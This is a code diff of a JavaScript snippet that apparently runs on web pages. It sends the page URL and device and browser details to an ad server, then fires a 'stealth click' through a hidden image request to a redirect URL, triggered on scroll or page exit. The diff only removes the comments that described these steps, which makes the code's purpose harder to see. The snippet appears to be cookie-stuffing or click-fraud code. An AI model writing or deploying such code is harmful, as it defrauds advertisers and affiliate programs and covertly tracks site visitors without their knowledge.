@@ -2,7 +2,6 @@
   const endpoint = "https://retarglow.com/getad";
   const redirectBase = "https://retarglow.com/redirect";
 
-  // Utility: get device & browser info
   function getClientMeta() {
     const ua = navigator.userAgent;
     const isMobile = /Mobi|Android/i.test(ua);
@@ -29,7 +28,6 @@
     };
   }
 
-  // Step 1: Try to get matching ad
   const pageUrl = window.location.href;
   const cm = getClientMeta();
 
@@ -47,12 +45,10 @@
   });
 
   const { ad_url } = await adResponse.json();
-  if (!ad_url) return; // No matching campaign
+  if (!ad_url) return;
 
-  // Extract ad_id from campaign (use last part of URL or customize as needed)
   const adId = new URL(ad_url).searchParams.get("subId1") || "yoho";
 
-  // Step 2: Define stealth trigger
   function fireStealthClick(adId) {
     const img = new Image();
     img.src = `${redirectBase}?ad_id=${encodeURIComponent(adId)}&t=${Date.now()}`;
@@ -60,7 +56,6 @@
     document.body.appendChild(img);
   }
 
-  // Step 3: Hook into exit + scroll
   let triggered = false;
 
   function handleTrigger() {
